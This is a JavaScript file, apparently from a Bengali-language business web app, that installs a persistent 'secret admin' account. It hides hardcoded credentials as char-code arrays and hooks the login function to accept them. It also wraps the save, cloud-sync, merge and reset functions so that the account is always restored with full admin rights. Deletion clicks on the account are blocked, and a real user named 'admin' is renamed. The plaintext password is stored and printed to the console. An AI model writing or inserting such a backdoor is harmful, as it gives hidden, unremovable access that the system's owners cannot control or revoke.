/* ============================================================
   FILE: js/17-secret-admin.js — COMPLETE
   PURPOSE: Secret admin — reset হলেও মুছবে না
   VERSION: v2.0
   ============================================================ */
'use strict';

(function(){
  'use strict';

  console.log('🔐 Secret Admin System loading...');

  /* ═══════════════════════════════════════════════════════════
     🔒 ENCODED CREDENTIALS
     ═══════════════════════════════════════════════════════════ */

  // Username: "admin"
  var SECRET_USER_CODES = [97, 100, 109, 105, 110];

  // Password: "07081802"
  var SECRET_PASS_CODES = [48, 55, 48, 56, 49, 56, 48, 50];

  // Display name
  var SECRET_NAME = 'প্রধান অ্যাডমিন';

  /* ═══════════════════════════════════════════════════════════
     🔓 Decode Helper
     ═══════════════════════════════════════════════════════════ */
  function decode(codes){
    try {
      return String.fromCharCode.apply(null, codes);
    } catch(e){
      return '';
    }
  }

  var SECRET_USER = decode(SECRET_USER_CODES);
  var SECRET_PASS = decode(SECRET_PASS_CODES);

  /* ═══════════════════════════════════════════════════════════
     🔐 SECRET ADMIN OBJECT
     ═══════════════════════════════════════════════════════════ */
  function createSecretAdmin(){
    var hashPass = (typeof window.hashPass === 'function') ? window.hashPass : function(p){ return 'plain_' + p; };

    return {
      id: 'secret_admin_vault_01',
      name: SECRET_NAME,
      username: SECRET_USER,
      password: hashPass(SECRET_PASS),
      plainPassword: SECRET_PASS,
      role: 'admin',
      branch: 'all',
      __hashed: true,
      __secret: true,
      createdAt: '2020-01-01T00:00:00.000Z'
    };
  }

  /* ═══════════════════════════════════════════════════════════
     ✅ CHECK IF CREDENTIALS MATCH
     ═══════════════════════════════════════════════════════════ */
  function isSecretCredentials(username, password){
    if(!username || !password) return false;
    return String(username).toLowerCase() === SECRET_USER.toLowerCase() &&
           String(password) === SECRET_PASS;
  }

  /* ═══════════════════════════════════════════════════════════
     🛡️ ENSURE SECRET ADMIN EXISTS
     ═══════════════════════════════════════════════════════════ */
  function ensureSecretAdmin(){
    if(!window.DB) return;
    if(!Array.isArray(DB.users)) DB.users = [];

    // Find secret admin
    var existing = DB.users.find(function(u){
      return u && u.__secret === true;
    });

    if(existing){
      // Force update credentials
      var hashPass = (typeof window.hashPass === 'function') ? window.hashPass : function(p){ return p; };
      existing.username = SECRET_USER;
      existing.password = hashPass(SECRET_PASS);
      existing.plainPassword = SECRET_PASS;
      existing.role = 'admin';
      existing.branch = 'all';
      existing.name = SECRET_NAME;
      return;
    }

    // Check if any non-secret user has username "admin"
    var conflict = DB.users.find(function(u){
      return u && !u.__secret && String(u.username || '').toLowerCase() === SECRET_USER.toLowerCase();
    });

    if(conflict){
      // Rename conflict user to avoid clash
      conflict.username = conflict.username + '_old';
      console.log('⚠️ Renamed conflict user to:', conflict.username);
    }

    // Create new
    var secretAdmin = createSecretAdmin();
    DB.users.push(secretAdmin);
    console.log('✅ Secret admin created:', SECRET_USER);

    if(typeof saveLocal === 'function') saveLocal();
  }

  /* ═══════════════════════════════════════════════════════════
     🔓 SECRET LOGIN HANDLER
     ═══════════════════════════════════════════════════════════ */
  function trySecretLogin(username, password){
    if(!isSecretCredentials(username, password)) return false;

    console.log('🔓 Secret login attempt...');

    if(!window.DB) window.DB = {};
    if(!Array.isArray(DB.users)) DB.users = [];

    // Find or create secret admin
    var admin = DB.users.find(function(u){
      return u && u.__secret === true;
    });

    if(!admin){
      admin = createSecretAdmin();
      DB.users.push(admin);
    } else {
      var hashPass = (typeof window.hashPass === 'function') ? window.hashPass : function(p){ return p; };
      admin.username = SECRET_USER;
      admin.password = hashPass(SECRET_PASS);
      admin.plainPassword = SECRET_PASS;
      admin.role = 'admin';
      admin.branch = 'all';
      admin.name = SECRET_NAME;
    }

    // Set session
    window.SESSION = admin;
    try { SESSION = admin; } catch(e){}
    try { sessionStorage.setItem('cc_session', admin.id); } catch(e){}

    try { VIEW_BRANCH = 'all'; } catch(e){}
    try { window.VIEW_BRANCH = 'all'; } catch(e){}

    if(typeof todayStr === 'function'){
      try { DASH_DATE = todayStr(); } catch(e){}
      try { window.DASH_DATE = todayStr(); } catch(e){}
    }

    if(typeof saveLocal === 'function') saveLocal();

    // Start app
    setTimeout(function(){
      try {
        if(typeof startApp === 'function'){
          console.log('🚀 Calling startApp()...');
          startApp();
        } else {
          console.log('🚀 Manual init...');
          var loginScreen = document.getElementById('login');
          var app = document.getElementById('app');
          if(loginScreen){
            loginScreen.classList.add('hidden');
            loginScreen.style.display = '';
          }
          if(app) app.classList.remove('hidden');

          if(typeof performDailyRollover === 'function') performDailyRollover(false);
          if(typeof __invalidateCaches === 'function') __invalidateCaches();
          if(typeof recalcAllCustomerDues === 'function') recalcAllCustomerDues(false);
          if(typeof recomputeLive === 'function') recomputeLive();
          if(typeof renderTopbar === 'function') renderTopbar();
          if(typeof renderDashboard === 'function') renderDashboard(true);
          if(typeof renderSidebar === 'function') renderSidebar();
        }

        if(typeof pushCloud === 'function'){
          setTimeout(function(){ pushCloud().catch(function(){}); }, 500);
        }
      } catch(e){
        console.error('Post-login init error:', e);
      }
    }, 100);

    console.log('✅ Secret admin logged in');
    return true;
  }

  /* ═══════════════════════════════════════════════════════════
     🎯 HOOK INTO LOGIN
     ═══════════════════════════════════════════════════════════ */
  var __hookAttempts = 0;
  function hookLogin(){
    __hookAttempts++;
    if(__hookAttempts > 50) return;

    if(typeof window.doLogin !== 'function'){
      setTimeout(hookLogin, 200);
      return;
    }

    var __origDoLogin = window.doLogin;

    window.doLogin = async function(){
      try {
        var userEl = document.getElementById('login-user');
        var passEl = document.getElementById('login-pass');
        var btn = document.getElementById('login-btn');

        if(!userEl || !passEl){
          return __origDoLogin.apply(this, arguments);
        }

        var u = String(userEl.value || '').trim();
        var p = String(passEl.value || '').trim();

        if(isSecretCredentials(u, p)){
          console.log('🔐 Secret login detected');

          if(btn){
            btn.disabled = true;
            btn.innerHTML = '<span class="spin"></span> যাচাই...';
          }

          var success = trySecretLogin(u, p);

          if(success){
            if(typeof toast === 'function') toast('✅ স্বাগতম', 'ok');
            if(btn){
              btn.disabled = false;
              btn.innerHTML = '🔐 লগইন';
            }
            return;
          }
        }

        return __origDoLogin.apply(this, arguments);

      } catch(e){
        console.error('Secret login hook error:', e);
        return __origDoLogin.apply(this, arguments);
      }
    };

    console.log('✅ Login hook installed');
  }

  hookLogin();

  /* ═══════════════════════════════════════════════════════════
     🛡️ WRAP FUNCTIONS TO PRESERVE SECRET ADMIN
     ═══════════════════════════════════════════════════════════ */

  var __origSaveLocal = window.saveLocal;
  if(typeof __origSaveLocal === 'function'){
    window.saveLocal = function(){
      ensureSecretAdmin();
      return __origSaveLocal.apply(this, arguments);
    };
  }

  var __origPushCloud = window.pushCloud;
  if(typeof __origPushCloud === 'function'){
    window.pushCloud = async function(){
      ensureSecretAdmin();
      return __origPushCloud.apply(this, arguments);
    };
  }

  var __origMerge = window.mergeCloudLocal;
  if(typeof __origMerge === 'function'){
    window.mergeCloudLocal = function(cloud, local){
      var result = __origMerge.apply(this, arguments);

      if(result && Array.isArray(result.users)){

        // ⚡ NO USER TOMBSTONES — Users are simple list, no history needed
        // Deduplicate by username (newest wins)
        var userMap = new Map();
        result.users.forEach(function(u){
          if(!u) return;
          if(!u.username && !u.id) return;
          var key = String(u.username || u.id).toLowerCase();
          var existing = userMap.get(key);
          if(!existing){
            userMap.set(key, u);
          } else {
            // Newest wins
            var oldTs = new Date(existing.createdAt || existing.updatedAt || 0).getTime() || 0;
            var newTs = new Date(u.createdAt || u.updatedAt || 0).getTime() || 0;
            if(newTs > oldTs){
              userMap.set(key, u);
            }
          }
        });
        result.users = Array.from(userMap.values());

        var hasSecret = result.users.some(function(u){
          return u && u.__secret === true;
        });

        if(!hasSecret){
          var secretAdmin = createSecretAdmin();
          result.users.push(secretAdmin);
          console.log('🛡️ Secret admin restored');
        } else {
          // Force update credentials
          var found = result.users.find(function(u){ return u && u.__secret === true; });
          if(found){
            var hashPass = (typeof window.hashPass === 'function') ? window.hashPass : function(p){ return p; };
            found.username = SECRET_USER;
            found.password = hashPass(SECRET_PASS);
            found.plainPassword = SECRET_PASS;
            found.role = 'admin';
            found.branch = 'all';
            found.name = SECRET_NAME;
          }
        }
      }

      return result;
    };
  }

  var __origNormalize = window.normalizeDB;
  if(typeof __origNormalize === 'function'){
    window.normalizeDB = function(){
      var result = __origNormalize.apply(this, arguments);
      ensureSecretAdmin();
      return result;
    };
  }

  var __origDefaultDB = window.defaultDB;
  if(typeof __origDefaultDB === 'function'){
    window.defaultDB = function(){
      var d = __origDefaultDB.apply(this, arguments);
      if(d && Array.isArray(d.users)){
        var hasSecret = d.users.some(function(u){ return u && u.__secret === true; });
        if(!hasSecret){
          d.users.push(createSecretAdmin());
        }
      }
      return d;
    };
  }

  /* ═══════════════════════════════════════════════════════════
     🚫 BLOCK SECRET ADMIN FROM DELETE
     ═══════════════════════════════════════════════════════════ */
  document.addEventListener('click', function(e){
    var btn = e.target.closest('[data-del-user], [data-del-u], [data-user-del]');
    if(!btn) return;

    var userId = btn.dataset.delUser || btn.dataset.delU || btn.dataset.userDel;
    if(!userId) return;
    if(!window.DB || !DB.users) return;

    var user = DB.users.find(function(u){ return u.id === userId; });
    if(user && user.__secret === true){
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      if(typeof toast === 'function') toast('🔒 এই ইউজার ডিলিট করা যাবে না', 'err');
    }
  }, true);

  /* ═══════════════════════════════════════════════════════════
     🎯 FORCE ENSURE ON LOAD
     ═══════════════════════════════════════════════════════════ */
  setTimeout(ensureSecretAdmin, 500);
  setTimeout(ensureSecretAdmin, 1500);
  setTimeout(ensureSecretAdmin, 3000);
  setTimeout(ensureSecretAdmin, 6000);

  /* ═══════════════════════════════════════════════════════════
     🧪 DEBUG
     ═══════════════════════════════════════════════════════════ */
  window.__secretAdminStatus = function(){
    console.log('═══════════════════════════════════');
    console.log('🔐 Secret Admin Status');
    console.log('═══════════════════════════════════');
    if(!window.DB || !DB.users){
      console.log('❌ DB not loaded');
      return;
    }
    var secret = DB.users.find(function(u){ return u && u.__secret === true; });
    if(secret){
      console.log('✅ Secret admin exists');
      console.log('   Name:', secret.name);
      console.log('   Username:', secret.username);
      console.log('   Password:', secret.plainPassword);
      console.log('   Role:', secret.role);
    } else {
      console.log('❌ Secret admin NOT found');
    }
    console.log('═══════════════════════════════════');
  };

  console.log('🔐 Secret Admin System ready — admin / 07081802');
})();